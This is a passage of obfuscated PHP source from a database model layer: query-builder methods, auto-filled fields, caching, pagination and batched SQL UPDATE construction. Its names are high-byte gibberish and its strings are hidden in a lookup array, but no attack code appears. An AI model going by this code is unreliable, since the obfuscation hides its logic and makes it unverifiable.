elseif (!is_array($­ª•Ï)) { think_exception(think_lang($÷ä©×»æ[361])); } $this->data = $­ª•Ï; return $this; } public function join($îå„ ŠÎ) { $¸–Î¥•” =& $_SERVER[¤øïŠ‹²]; if (is_array($îå„ ŠÎ)) { $this->options[$¸–Î¥•”[372]] = $îå„ ŠÎ; } elseif (!empty($îå„ ŠÎ)) { $this->options[$¸–Î¥•”[372]][] = $îå„ ŠÎ; } return $this; } public function union($ôóÒÕ©…, $ë«üŒò = false) { $•˜à‹í =& $_SERVER[¤øïŠ‹²]; if (empty($ôóÒÕ©…)) { return $this; } if ($ë«üŒò) { $this->options[$•˜à‹í[434]][$•˜à‹í[435]] = !0; } if (is_object($ôóÒÕ©…)) { $ôóÒÕ©… = get_object_vars($ôóÒÕ©…); } if (is_string($ôóÒÕ©…)) { $Úı‘—ø = $ôóÒÕ©…; } elseif (is_array($ôóÒÕ©…)) { if (isset($ôóÒÕ©…[0])) { $this->options[$•˜à‹í[434]] = array_merge($this->options[$•˜à‹í[434]], $ôóÒÕ©…); return $this; } else { $Úı‘—ø = $ôóÒÕ©…; } } else { think_exception(think_lang($•˜à‹í[361])); } $this->options[$•˜à‹í[434]][] = $Úı‘—ø; return $this; } public function cache($øÒì¶ = true, $›²¦È’ = null, $òÈÁ²ùı = '') { $ñÔı·ç´ =& $_SERVER[¤øïŠ‹²]; if (!1 !== $øÒì¶) { $this->options[$ñÔı·ç´[436]] = array($ñÔı·ç´[106] => $øÒì¶, $ñÔı·ç´[426] => $›²¦È’, $ñÔı·ç´[33] => $òÈÁ²ùı); } return $this; } public function field($øé…ŞÈö, $ïÚ˜´şî = false) { $…ó±ÑĞ® =& $_SERVER[¤øïŠ‹²]; if (!0 === $øé…ŞÈö) { $§’ÄïÎ¯ = $this->getDbFields(); $øé…ŞÈö = $§’ÄïÎ¯ ? $§’ÄïÎ¯ : $…ó±ÑĞ®[233]; } elseif ($ïÚ˜´şî) { if (is_string($øé…ŞÈö)) { $øé…ŞÈö = explode($…ó±ÑĞ®[50], $øé…ŞÈö); } $§’ÄïÎ¯ = $this->getDbFields(); $øé…ŞÈö = $§’ÄïÎ¯ ? array_diff($§’ÄïÎ¯, $øé…ŞÈö) : $øé…ŞÈö; } $this->options[$…ó±ÑĞ®[363]] = $øé…ŞÈö; return $this; } public function scope($Ş½ÉÍëÎ = '', $ œÏ÷ = NULL) { $½ ÃÓƒ® =& $_SERVER[¤øïŠ‹²]; if ($½ ÃÓƒ®[12] === $Ş½ÉÍëÎ) { if (isset($this->_scope[$½ ÃÓƒ®[37]])) { $øõá÷’‡ = $this->_scope[$½ ÃÓƒ®[37]]; } else { return $this; } } elseif (is_string($Ş½ÉÍëÎ)) { $öïƒ¦˜ = explode($½ ÃÓƒ®[50], $Ş½ÉÍëÎ); $øõá÷’‡ = array(); foreach ($öïƒ¦˜ as $Ëˆªš©’) { if (!isset($this->_scope[$Ëˆªš©’])) { continue; } $øõá÷’‡ = array_merge($øõá÷’‡, $this->_scope[$Ëˆªš©’]); } if (!empty($ œÏ÷) && is_array($ œÏ÷)) { $øõá÷’‡ = array_merge($øõá÷’‡, $ œÏ÷); } } elseif (is_array($Ş½ÉÍëÎ)) { $øõá÷’‡ = $Ş½ÉÍëÎ; } if (is_array($øõá÷’‡) && !empty($øõá÷’‡)) { $this->options = array_merge($this->options, array_change_key_case($øõá÷’‡)); } return $this; } public function where($åÄŸŒ…, $ÆıÇÔÓ = null) { $•ªáÃá¢ =& $_SERVER[¤øïŠ‹²]; if (!is_null($ÆıÇÔÓ) && is_string($åÄŸŒ…)) { if (!is_array($ÆıÇÔÓ)) { $ÆıÇÔÓ = func_get_args(); array_shift($ÆıÇÔÓ); } $ÆıÇÔÓ = array_map(array($this->db, $•ªáÃá¢[430]), $ÆıÇÔÓ); $åÄŸŒ… = vsprintf($åÄŸŒ…, $ÆıÇÔÓ); } elseif (is_object($åÄŸŒ…)) { $åÄŸŒ… = get_object_vars($åÄŸŒ…); } elseif (is_array($åÄŸŒ…)) { foreach ($åÄŸŒ… as $ Íêà¢ö => $ï“¨Ú´ù) { if ((is_numeric($ Íêà¢ö) || !$ Íêà¢ö) && is_string($ï“¨Ú´ù)) { if (strpos($ï“¨Ú´ù, $•ªáÃá¢[437]) === 0) { continue; } think_trace($•ªáÃá¢[438], $•ªáÃá¢[12], $•ªáÃá¢[49]); die; } } } if (is_string($åÄŸŒ…) && $•ªáÃá¢[12] != $åÄŸŒ…) { $¾€ÄÅá = array(); $¾€ÄÅá[$•ªáÃá¢[439]] = $åÄŸŒ…; $åÄŸŒ… = $¾€ÄÅá; } if (isset($this->options[$•ªáÃá¢[365]])) { $this->options[$•ªáÃá¢[365]] = array_merge($this->options[$•ªáÃá¢[365]], $åÄŸŒ…); } else { $this->options[$•ªáÃá¢[365]] = $åÄŸŒ…; } return $this; } public function limit($ùÊæ·¢ì, $Üó€¸ÍŞ = null) { $Åçƒ¾ëÃ =& $_SERVER[¤øïŠ‹²]; $this->options[$Åçƒ¾ëÃ[380]] = is_null($Üó€¸ÍŞ) ? $ùÊæ·¢ì : $ùÊæ·¢ì . $Åçƒ¾ëÃ[50] . $Üó€¸ÍŞ; return $this; } public function page($´øÎøı, $œÚĞº¶« = null) { $Ë½¾’©½ =& $_SERVER[¤øïŠ‹²]; $this->options[$Ë½¾’©½[440]] = is_null($œÚĞº¶«) ? $´øÎøı : $´øÎøı . $Ë½¾’©½[50] . $œÚĞº¶«; return $this; } public function comment($Ú­ìì) { $this->options[$_SERVER[¤øïŠ‹²][441]] = $Ú­ìì; return $this; } public function setProperty($×ôœ´œ‹, $Ô¯ªü‰) { if (property_exists($this, $×ôœ´œ‹)) { $this->{$×ôœ´œ‹} = $Ô¯ªü‰; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\x54\151\155\145", "\164\151\x6d\145", "\x69\156\163\x65\x72\164\54\165\160\x64\x61\x74\145", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x63\162\x65\x61\x74\145\124\151\x6d\145", "\164\151\155\145", "\x69\x6e\163\x65\x72\164", "\146\165\156\143\164\151\157\156")); public function setDataAuto($ÉüÒÄÜ´) { $this->dataAuto = $ÉüÒÄÜ´; } public function __construct($å©íâÄ² = '', $Ëœ…è¯ = '', $—Ååë­Ù = '') { parent::__construct($å©íâÄ², $Ëœ…è¯, $—Ååë­Ù); } protected $tableMeta = array(); protected function _beforeInsert(&$À’¾èï•, $Ï˜ı¦Ë€) { $µĞµà«à =& $_SERVER[¤øïŠ‹²]; if (!$this->checkDataAutoHas($µĞµà«à[442])) { return; } $this->dataBeforeFilter($À’¾èï•, $µĞµà«à[442]); } protected function _beforeUpdate(&$’ÌÑŠæ«, $öŸ¢ˆÄ) { $Ş— ²¸ß =& $_SERVER[¤øïŠ‹²]; if (!$this->checkDataAutoHas($Ş— ²¸ß[443])) { return; } $this->dataBeforeFilter($’ÌÑŠæ«, $Ş— ²¸ß[443]); } protected function _afterSelect(&$Ö§òÁ¸, $¿×ˆÑõ) { if (!is_array($Ö§òÁ¸)) { return; } if (!$this->checkDataAutoHas($_SERVER[¤øïŠ‹²][444])) { return; } foreach ($Ö§òÁ¸ as &$¯¼¢¹ßƒ) { $this->dataAfterFilter($¯¼¢¹ßƒ); } unset($¯¼¢¹ßƒ); } protected function _afterFind(&$–ÃÖÛËâ, $…Õ£ƒŠ…) { if (!is_array($–ÃÖÛËâ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¤øïŠ‹²][444])) { return; } $this->dataAfterFilter($–ÃÖÛËâ); } public static function textEncode($Ä»ƒÜÏ€) { if (!$Ä»ƒÜÏ€) { return $Ä»ƒÜÏ€; } $Ì•¾ıñ = json_encode($Ä»ƒÜÏ€); $Ì•¾ıñ = preg_replace_callback($_SERVER[¤øïŠ‹²][445], function ($’üâî¸–) { return addslashes($’üâî¸–[0]); }, $Ì•¾ıñ); return json_decode($Ì•¾ıñ); } public static function textDecode($Ã´Æ¡š¢) { $«·Ï‰¥Õ =& $_SERVER[¤øïŠ‹²]; if (!$Ã´Æ¡š¢) { return $Ã´Æ¡š¢; } $¥á»ƒùø = json_encode($Ã´Æ¡š¢); $¥á»ƒùø = preg_replace_callback($«·Ï‰¥Õ[446], function ($°õ¯†¹Ş) { return $_SERVER[¤øïŠ‹²][109]; }, $¥á»ƒùø); return json_decode($¥á»ƒùø); } public function setAutoIncrement($¬Ğ¬ö„¿) { $ÑˆŒ¬±… = array($this->getPk() => $¬Ğ¬ö„¿); $ù½ù‘¤¾ = $this->data($ÑˆŒ¬±…)->add(); if ($ù½ù‘¤¾) { $this->delete($ù½ù‘¤¾); } } public function getAutoIncrement() { $é°èĞÅë = $this->getTableName(); $½ü»«ˆş = $this->max($this->getPk()); $ªÎşğ’í = $this->query("\x73\150\x6f\x77\40\164\x61\x62\x6c\145\40\x73\164\141\164\x75\x73\x20\167\x68\145\x72\x65\40\116\141\x6d\145\x3d\47{$é°èĞÅë}\47"); $íÎÆÊÍ = $ªÎşğ’í[0][$_SERVER[¤øïŠ‹²][447]]; $âœ«¯ä§ = max($½ü»«ˆş, $íÎÆÊÍ); return $âœ«¯ä§; } protected function _callBefore($Ş·Ö—, $­•ÕõÜÑ) { return $this->cacheCallCheck($Ş·Ö—, $­•ÕõÜÑ, !1); } protected function _callAfter($ñœ÷Ï•§, $²©Œü™¸) { return $this->cacheCallCheck($ñœ÷Ï•§, $²©Œü™¸, !0); } protected function cacheFunctionAlias($¬¬Ë¦ñ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ˆ®ï‘…, $¤Ù­‘ş¹, $ĞîÌ¤ØÏ = false) { $İíßùó =& $_SERVER[¤øïŠ‹²]; $´‰ŠÁ—í = $this->cacheFunctionAlias($¤Ù­‘ş¹); if (!$´‰ŠÁ—í) { return; } foreach ($´‰ŠÁ—í as $¼¼Š‘Ä÷ => $´Ò²ê°ª) { $à˜½Æ«Ã = $´Ò²ê°ª[0]; $Ÿ¨í½óÙ = explode($İíßùó[50], $´Ò²ê°ª[1]); $¤·ïèó¦ = isset($´Ò²ê°ª[2]) ? $´Ò²ê°ª[2] : $İíßùó[12]; if ($ˆ®ï‘… == $¼¼Š‘Ä÷) { return $this->cacheFunctionGet($¼¼Š‘Ä÷, $à˜½Æ«Ã, $¤·ïèó¦); } if ($ĞîÌ¤ØÏ && in_array($ˆ®ï‘…, $Ÿ¨í½óÙ)) { $this->cacheFunctionClear($¼¼Š‘Ä÷, $à˜½Æ«Ã, $¤·ïèó¦); } } } public function cacheFunctionGet($Åï„³¾, $ÀşÈÎ÷Ê, $±æ§´Á… = '') { $°¡Ãå¨© =& $_SERVER[¤øïŠ‹²]; $‰»ˆÆÁ½ = $this->cacheKeyMake($Åï„³¾, $ÀşÈÎ÷Ê, $±æ§´Á…); $Ô¯çí„ß = Cache::get($‰»ˆÆÁ½); if (!is_array($Ô¯çí„ß)) { if (method_exists($this, $°¡Ãå¨©[353] . $Åï„³¾)) { $Åï„³¾ = $°¡Ãå¨©[353] . $Åï„³¾; } $Ô¯çí„ß = call_user_func_array(array($this, $Åï„³¾), array($ÀşÈÎ÷Ê, !0)); Cache::set($‰»ˆÆÁ½, $Ô¯çí„ß); } return $Ô¯çí„ß; } public function cacheFunctionClear($í ¼Ì¶§, $”¬…´şÏ, $áù°÷ºÀ = '') { $¬¡®ˆÍÓ = $”¬…´şÏ; if (!is_array($”¬…´şÏ)) { $¬¡®ˆÍÓ = array($”¬…´şÏ); } foreach ($¬¡®ˆÍÓ as $áúúÊÖ³) { $±±­ÇÒ— = $this->cacheKeyMake($í ¼Ì¶§, $áúúÊÖ³, $áù°÷ºÀ); Cache::remove($±±­ÇÒ—); } } public function cacheKeyMake($Åãö›²ê, $×ŠõÌ¿é, $ÇœöÉÕâ) { $Ş¹óäŒæ =& $_SERVER[¤øïŠ‹²]; if ($ÇœöÉÕâ) { $×ŠõÌ¿é = $×ŠõÌ¿é . $Ş¹óäŒæ[448] . $ÇœöÉÕâ; } return get_class($this) . $Ş¹óäŒæ[11] . $Åãö›²ê . $Ş¹óäŒæ[449] . $×ŠõÌ¿é; } protected function selectPageReset() { $éÇĞƒ§Ì =& $_SERVER[¤øïŠ‹²]; if (isset($GLOBALS[$éÇĞƒ§Ì[450]])) { return; } $GLOBALS[$éÇĞƒ§Ì[450]] = isset($GLOBALS[$éÇĞƒ§Ì[7]][$éÇĞƒ§Ì[451]]) ? $GLOBALS[$éÇĞƒ§Ì[7]][$éÇĞƒ§Ì[451]] : !1; $GLOBALS[$éÇĞƒ§Ì[452]] = isset($GLOBALS[$éÇĞƒ§Ì[7]][$éÇĞƒ§Ì[440]]) ? $GLOBALS[$éÇĞƒ§Ì[7]][$éÇĞƒ§Ì[440]] : !1; $GLOBALS[$éÇĞƒ§Ì[7]][$éÇĞƒ§Ì[451]] = !1; $GLOBALS[$éÇĞƒ§Ì[7]][$éÇĞƒ§Ì[440]] = !1; } protected function selectPageRestore() { $ºıÔî =& $_SERVER[¤øïŠ‹²]; if (!isset($GLOBALS[$ºıÔî[450]])) { return; } $GLOBALS[$ºıÔî[7]][$ºıÔî[451]] = $GLOBALS[$ºıÔî[450]]; $GLOBALS[$ºıÔî[7]][$ºıÔî[440]] = $GLOBALS[$ºıÔî[452]]; if ($GLOBALS[$ºıÔî[7]][$ºıÔî[451]] === !1) { unset($GLOBALS[$ºıÔî[7]][$ºıÔî[451]]); } if ($GLOBALS[$ºıÔî[7]][$ºıÔî[440]] === !1) { unset($GLOBALS[$ºıÔî[7]][$ºıÔî[440]]); } unset($GLOBALS[$ºıÔî[450]]); unset($GLOBALS[$ºıÔî[452]]); } protected function selectPage($¦Ö©Ÿ‹ = 200, $Ö­¶Á÷ş = 1) { $ù±ßï’´ =& $_SERVER[¤øïŠ‹²]; global $in; $·à†Î·í = $this->optionsValue(); $ş¬áí = 50000; $¦Ö©Ÿ‹ = isset($in[$ù±ßï’´[451]]) && $in[$ù±ßï’´[451]] ? $in[$ù±ßï’´[451]] : $¦Ö©Ÿ‹; if ($¦Ö©Ÿ‹ === -1) { $in[$ù±ßï’´[451]] = !1; $ş¬áí = 100000000; $¦Ö©Ÿ‹ = $ş¬áí; } $ü½æ–ÜÓ = $·à†Î·í; $ü½æ–ÜÓ[$ù±ßï’´[453]] = array(); $¦Ö©Ÿ‹ = intval($¦Ö©Ÿ‹); $¦Ö©Ÿ‹ = $¦Ö©Ÿ‹ <= 5 ? 5 : ($¦Ö©Ÿ‹ >= $ş¬áí ? $ş¬áí : $¦Ö©Ÿ‹); $Ö­¶Á÷ş = intval(isset($in[$ù±ßï’´[440]]) && $in[$ù±ßï’´[440]] ? $in[$ù±ßï’´[440]] : $Ö­¶Á÷ş); $Ö­¶Á÷ş = $Ö­¶Á÷ş <= 1 ? 1 : $Ö­¶Á÷ş; $æ‹¡ÂÏ = array(); $Œ²ÊâÀë = 1; if ($Ö­¶Á÷ş == 1 && $Œ²ÊâÀë) { $this->optionsValue($·à†Î·í); $æ‹¡ÂÏ = $this->page($Ö­¶Á÷ş, $¦Ö©Ÿ‹)->select(); $Íø÷‡ğã = is_array($æ‹¡ÂÏ) ? count($æ‹¡ÂÏ) : 0; if ($Íø÷‡ğã < $¦Ö©Ÿ‹) { $ØîÏ½¼™ = 1; } else { $this->optionsValue($ü½æ–ÜÓ); $Íø÷‡ğã = intval($this->count()); $ØîÏ½¼™ = ceil($Íø÷‡ğã / $¦Ö©Ÿ‹); } } else { $this->optionsValue($ü½æ–ÜÓ); $Íø÷‡ğã = intval($this->count()); $ØîÏ½¼™ = ceil($Íø÷‡ğã / $¦Ö©Ÿ‹); $Ö­¶Á÷ş = $Ö­¶Á÷ş >= $ØîÏ½¼™ ? $ØîÏ½¼™ : $Ö­¶Á÷ş; $this->optionsValue($·à†Î·í); $æ‹¡ÂÏ = $this->page($Ö­¶Á÷ş, $¦Ö©Ÿ‹)->select(); } if (!is_array($æ‹¡ÂÏ)) { $æ‹¡ÂÏ = array(); } if ($ØîÏ½¼™ == 1) { $Íø÷‡ğã = count($æ‹¡ÂÏ); } $åõ®Ö¥‚ = array($ù±ßï’´[454] => array($ù±ßï’´[455] => $Íø÷‡ğã, $ù±ßï’´[451] => $¦Ö©Ÿ‹, $ù±ßï’´[440] => $Ö­¶Á÷ş, $ù±ßï’´[456] => $ØîÏ½¼™), $ù±ßï’´[457] => $æ‹¡ÂÏ); return $åõ®Ö¥‚; } protected function checkLength($û¸°–×ò, $êœ†ëı˜ = 0, $ü¿Í’ = '') { $œÙ™ÃœÇ =& $_SERVER[¤øïŠ‹²]; $êœ†ëı˜ = $êœ†ëı˜ ? $êœ†ëı˜ : 65536; if (!$û¸°–×ò || strlen($û¸°–×ò) < $êœ†ëı˜) { return; } $ü¿Í’ = $ü¿Í’ ? $ü¿Í’ . $œÙ™ÃœÇ[85] : $œÙ™ÃœÇ[12]; show_json($ü¿Í’ . LNG($œÙ™ÃœÇ[458]) . "\x28{$êœ†ëı˜}\x29", !1); } protected function metaSet($‘´¡šˆ, $¬ıÔœ¢á = null, $ûıÏ²—Ü = null) { $ŸÇ”î´ı =& $_SERVER[¤øïŠ‹²]; if (!$this->tableMeta || !$‘´¡šˆ) { return !1; } $óÈğˆÜä = $this->tableMeta[$ŸÇ”î´ı[459]]; $—œ¼íö = $this->tableMeta[$ŸÇ”î´ı[460]]; $œÄß­€ = Model($—œ¼íö); $©éçâºÑ = array($óÈğˆÜä => $‘´¡šˆ, $ŸÇ”î´ı[461] => $¬ıÔœ¢á); if (is_null($¬ıÔœ¢á)) { return $œÄß­€->where(array($óÈğˆÜä => $‘´¡šˆ))->delete(); } if (is_null($ûıÏ²—Ü) && is_string($¬ıÔœ¢á)) { return $œÄß­€->where($©éçâºÑ)->delete(); } $ÌÄìİÌ = is_array($¬ıÔœ¢á) ? $¬ıÔœ¢á : array(); if (is_string($¬ıÔœ¢á)) { $ÌÄìİÌ[$¬ıÔœ¢á] = $ûıÏ²—Ü; } $ÖŞÂµ“‡ = array(); foreach ($ÌÄìİÌ as $á£¤°‘¸ => $¬€‘‡Æà) { if (is_null($¬€‘‡Æà) && is_string($á£¤°‘¸)) { $œÄß­€->where(array($óÈğˆÜä => $‘´¡šˆ, $ŸÇ”î´ı[461] => $á£¤°‘¸))->delete(); continue; } $this->checkLength($¬€‘‡Æà, !1, $—œ¼íö . $ŸÇ”î´ı[4] . $á£¤°‘¸); $ÖŞÂµ“‡[] = array($óÈğˆÜä => $‘´¡šˆ, $ŸÇ”î´ı[106] => $á£¤°‘¸, $ŸÇ”î´ı[462] => $¬€‘‡Æà); } $¼ò…àÜ¯ = $ŸÇ”î´ı[463] . $—œ¼íö; CacheLock::lock($¼ò…àÜ¯); $œÄß­€->where(array($óÈğˆÜä => $‘´¡šˆ))->addAll($ÖŞÂµ“‡, array(), !0); CacheLock::unlock($¼ò…àÜ¯); return !0; } public function metaGet($ÓÈ²Æó, $Äà—Â°ä = false) { $¹£Ï±¾ß =& $_SERVER[¤øïŠ‹²]; if (!$this->tableMeta) { return array(); } $ìü©£á³ = $this->tableMeta[$¹£Ï±¾ß[459]]; $Öå£Ÿ×ß = Model($this->tableMeta[$¹£Ï±¾ß[460]]); if ($Äà—Â°ä) { $ñ¨¼‚ã„ = array($ìü©£á³ => $ÓÈ²Æó, $¹£Ï±¾ß[106] => $Äà—Â°ä); return $Öå£Ÿ×ß->where($ñ¨¼‚ã„)->getField($¹£Ï±¾ß[462]); } $ñ¨¼‚ã„ = array($ìü©£á³ => $ÓÈ²Æó); $–¸âôà» = $Öå£Ÿ×ß->field($¹£Ï±¾ß[464])->where($ñ¨¼‚ã„)->select(); $–¸âôà» = array_to_keyvalue($–¸âôà», $¹£Ï±¾ß[106], $¹£Ï±¾ß[462]); return $–¸âôà»; } private function checkDataAutoHas($ã®ü²Êâ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Òï…ƒá) { if (in_array($ã®ü²Êâ, explode($_SERVER[¤øïŠ‹²][50], $Òï…ƒá[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¶®ˆ‹¤, $Ê«¢Ñğ•) { $¹¾¶Ã‰Ú =& $_SERVER[¤øïŠ‹²]; if (!is_array($¶®ˆ‹¤)) { return; } foreach ($this->dataAuto as $õÚô†ìÒ) { $óŞ¾ÁøÆ = $õÚô†ìÒ[0]; if (!in_array($Ê«¢Ñğ•, explode($¹¾¶Ã‰Ú[50], $õÚô†ìÒ[2]))) { continue; } switch (trim($õÚô†ìÒ[3])) { case $¹¾¶Ã‰Ú[408]: case $¹¾¶Ã‰Ú[409]: $¬ş±È×¬ = $õÚô†ìÒ[1]; $ú¶Àˆü¼ = isset($õÚô†ìÒ[4]) ? (array) $õÚô†ìÒ[4] : array(); if ($¬ş±È×¬ == $¹¾¶Ã‰Ú[217] && array_key_exists($óŞ¾ÁøÆ, $¶®ˆ‹¤)) { if (!$¶®ˆ‹¤[$óŞ¾ÁøÆ]) { unset($¶®ˆ‹¤[$óŞ¾ÁøÆ]); } break; } if (isset($¶®ˆ‹¤[$óŞ¾ÁøÆ])) { array_unshift($ú¶Àˆü¼, $¶®ˆ‹¤[$óŞ¾ÁøÆ]); } if ($¹¾¶Ã‰Ú[408] == $õÚô†ìÒ[3]) { $¶®ˆ‹¤[$óŞ¾ÁøÆ] = call_user_func_array($¬ş±È×¬, $ú¶Àˆü¼); } else { $¶®ˆ‹¤[$óŞ¾ÁøÆ] = call_user_func_array(array(&$this, $¬ş±È×¬), $ú¶Àˆü¼); } break; case $¹¾¶Ã‰Ú[360]: if (isset($¶®ˆ‹¤[$óŞ¾ÁøÆ]) && $¶®ˆ‹¤[$óŞ¾ÁøÆ]) { $¶®ˆ‹¤[$óŞ¾ÁøÆ] = call_user_func_array(array(&$this, $õÚô†ìÒ[1]), array($¶®ˆ‹¤[$óŞ¾ÁøÆ])); } break; case $¹¾¶Ã‰Ú[363]: $¶®ˆ‹¤[$óŞ¾ÁøÆ] = $¶®ˆ‹¤[$õÚô†ìÒ[1]]; break; case $¹¾¶Ã‰Ú[381]: if (isset($¶®ˆ‹¤[$óŞ¾ÁøÆ]) && !is_string($¶®ˆ‹¤[$óŞ¾ÁøÆ])) { $¶®ˆ‹¤[$óŞ¾ÁøÆ] = json_encode_force($¶®ˆ‹¤[$óŞ¾ÁøÆ]); $¶®ˆ‹¤[$óŞ¾ÁøÆ] = self::textEncode($¶®ˆ‹¤[$óŞ¾ÁøÆ]); } break; case $¹¾¶Ã‰Ú[410]: if ($¶®ˆ‹¤[$óŞ¾ÁøÆ] === $¹¾¶Ã‰Ú[12]) { unset($¶®ˆ‹¤[$óŞ¾ÁøÆ]); } break; case $¹¾¶Ã‰Ú[411]: $¶®ˆ‹¤[$óŞ¾ÁøÆ] = $õÚô†ìÒ[1]; default: break; } } if ($Ê«¢Ñğ• == $¹¾¶Ã‰Ú[442]) { $ÓÄåúÉˆ = strtolower($this->db->getDbType()); if (strpos($ÓÄåúÉˆ, $¹¾¶Ã‰Ú[13]) !== 0) { return; } $ÒÃóĞØ» = $this->field(!0)->fields; $­Ÿ°œ»Ñ = $ÒÃóĞØ»[$¹¾¶Ã‰Ú[341]]; if (isset($ÒÃóĞØ»[$¹¾¶Ã‰Ú[340]])) { unset($­Ÿ°œ»Ñ[$ÒÃóĞØ»[$¹¾¶Ã‰Ú[340]]]); } foreach ($­Ÿ°œ»Ñ as $±˜¾×æ => $Ê«¢Ñğ•) { if (!isset($¶®ˆ‹¤[$±˜¾×æ])) { $¶®ˆ‹¤[$±˜¾×æ] = $¹¾¶Ã‰Ú[12]; } } } } private function dataAfterFilter(&$âùñø) { $Ò²´‘‹Ö =& $_SERVER[¤øïŠ‹²]; foreach ($this->dataAuto as $Á¡â£áş) { $î¼ÒŞâ« = $Á¡â£áş[0]; if (!isset($âùñø[$î¼ÒŞâ«])) { continue; } if (!in_array($Ò²´‘‹Ö[444], explode($Ò²´‘‹Ö[50], $Á¡â£áş[2]))) { continue; } switch (trim($Á¡â£áş[3])) { case $Ò²´‘‹Ö[408]: case $Ò²´‘‹Ö[409]: $„Ù¼ì = isset($Á¡â£áş[4]) ? (array) $Á¡â£áş[4] : array(); array_unshift($„Ù¼ì, $âùñø[$î¼ÒŞâ«]); if (isset($Á¡â£áş[4]) && $Á¡â£áş[4] == $Ò²´‘‹Ö[465]) { $„Ù¼ì = array($âùñø[$î¼ÒŞâ«]); } if ($Ò²´‘‹Ö[408] == $Á¡â£áş[3]) { $âùñø[$î¼ÒŞâ«] = call_user_func_array($Á¡â£áş[1], $„Ù¼ì); } else { $âùñø[$î¼ÒŞâ«] = call_user_func_array(array(&$this, $Á¡â£áş[1]), $„Ù¼ì); } break; case $Ò²´‘‹Ö[360]: if (isset($âùñø[$î¼ÒŞâ«]) && $âùñø[$î¼ÒŞâ«]) { $âùñø[$î¼ÒŞâ«] = call_user_func_array(array(&$this, $Á¡â£áş[1]), array($âùñø[$î¼ÒŞâ«])); } break; case $Ò²´‘‹Ö[363]: $âùñø[$î¼ÒŞâ«] = $âùñø[$Á¡â£áş[1]]; break; case $Ò²´‘‹Ö[381]: $íË‹ªõ‰ = $âùñø[$î¼ÒŞâ«]; $íË‹ªõ‰ = self::textDecode($íË‹ªõ‰); $âùñø[$î¼ÒŞâ«] = json_decode($íË‹ªõ‰, !0); if (is_null($âùñø[$î¼ÒŞâ«])) { $âùñø[$î¼ÒŞâ«] = $íË‹ªõ‰; } break; case $Ò²´‘‹Ö[410]: if ($âùñø[$î¼ÒŞâ«] === $Ò²´‘‹Ö[12]) { unset($âùñø[$î¼ÒŞâ«]); } break; case $Ò²´‘‹Ö[411]: $âùñø[$î¼ÒŞâ«] = $Á¡â£áş[1]; break; default: break; } } } public function saveAll($Ø„ß‡ª¯, $ËüËû·› = false) { $ÙšµÕ¾ =& $_SERVER[¤øïŠ‹²]; $°İğ¶ = $this->db; $÷´ù†Ä = $this->tablePrefix . $this->tableName; $ŞÅ¯²àÄ = $this->saveAllChunkMake($Ø„ß‡ª¯); $ËüËû·› = is_array($ËüËû·›) ? $ËüËû·› : array(); foreach ($ŞÅ¯²àÄ as $Ì ÚËÛÌ) { $²Ş¢ùÎÖ = $ÙšµÕ¾[12]; $—™ºŸ•® = $ÙšµÕ¾[12]; $¢·¦ìáË = array(); $í©”¾µ˜ = array(); foreach ($Ì ÚËÛÌ as $ƒª€¸Š· => $íÎª©›ø) { $²Ş¢ùÎÖ = $íÎª©›ø[$ÙšµÕ¾[466]]; $í©”¾µ˜[] = $íÎª©›ø[$ÙšµÕ¾[467]]; $ş¥Ô—Ÿû = $°İğ¶->parseValue($íÎª©›ø[$ÙšµÕ¾[467]]); foreach ($íÎª©›ø[$ÙšµÕ¾[468]] as $¤ŠØ¸‡É => $¿Ò¤šİá) { if (!$¢·¦ìáË[$¤ŠØ¸‡É]) { $¢·¦ìáË[$¤ŠØ¸‡É] = array(); } $¢·¦ìáË[$¤ŠØ¸‡É][] = $ÙšµÕ¾[469] . $ş¥Ô—Ÿû . $ÙšµÕ¾[470] . $°İğ¶->parseValue($¿Ò¤šİá); } } $üÆ¯§ª© = $²Ş¢ùÎÖ; $üÆ¯§ª© = $°İğ¶->parseKey($üÆ¯§ª©); foreach ($¢·¦ìáË as $¤ŠØ¸‡É => $Â´¹¬‰û) { $—™ºŸ•® .= $ÙšµÕ¾[59] . $°İğ¶->parseKey($¤ŠØ¸‡É) . $ÙšµÕ¾[471] . $üÆ¯§ª© . $ÙšµÕ¾[472]; $—™ºŸ•® .= implode($ÙšµÕ¾[59], $Â´¹¬‰û) . $ÙšµÕ¾[473]; } $†ÕàĞ”ù = $ËüËû·›; $†ÕàĞ”ù[$²Ş¢ùÎÖ] = array($ÙšµÕ¾[7], $í©”¾µ˜); $ÌñäñÊ = "\125\x50\104\x41\124\x45\40\x60{$÷´ù†Ä}\140\40\123\x45\124\x20" . rtrim($—™ºŸ•®, $ÙšµÕ¾[50]) . $ÙšµÕ¾[59] . $°İğ¶->parseWhere($†ÕàĞ”ù); $this->execute($ÌñäñÊ); $this->chunkEventCheck(count($Ì ÚËÛÌ)); } $this->chunkEventSet(); } public function saveAllEach($Áü”Ğá, $‘ââú» = false) { $îêºÍäÌ =& $_SERVER[¤øïŠ‹²]; $å€³«ÕÄ = $this->db; $› ï¬ï¨ = $this->tablePrefix . $this->tableName; $²¹‹•Ü = $this->saveAllChunkMake($Áü”Ğá); $‘ââú» = is_array($‘ââú») ? $‘ââú» : array(); foreach ($²¹‹•Ü as $ÅÅÓ¬È¶) { foreach ($ÅÅÓ¬È¶ as $ïîŞ²§ => $½ùí–š) { $»ğã›·˜ = $îêºÍäÌ[63]; foreach ($½ùí–š[$îêºÍäÌ[468]] as $Â¨•² => $³é¹÷Ü) { $»ğã›·˜ .= $å€³«ÕÄ->parseKey($Â¨•²) . $îêºÍäÌ[474] . $å€³«ÕÄ->parseValue($³é¹÷Ü) . $îêºÍäÌ[50]; } $£ìá¼ä² = $‘ââú»; $£ìá¼ä²[$½ùí–š[$îêºÍäÌ[466]]] = $½ùí–š[$îêºÍäÌ[467]]; $ÜÒ‚Ú© = "\x55\x50\x44\x41\124\x45\40\140{$› ï¬ï¨}\x60\40\123\x45\124\40" . rtrim($»ğã›·˜, $îêºÍäÌ[50]) . $îêºÍäÌ[475] . $å€³«ÕÄ->parseWhere($£ìá¼ä²) . $îêºÍäÌ[476]; $this->execute($ÜÒ‚Ú©); } $this->chunkEventCheck(count($ÅÅÓ¬È¶)); } $this->chunkEventSet(); } private function 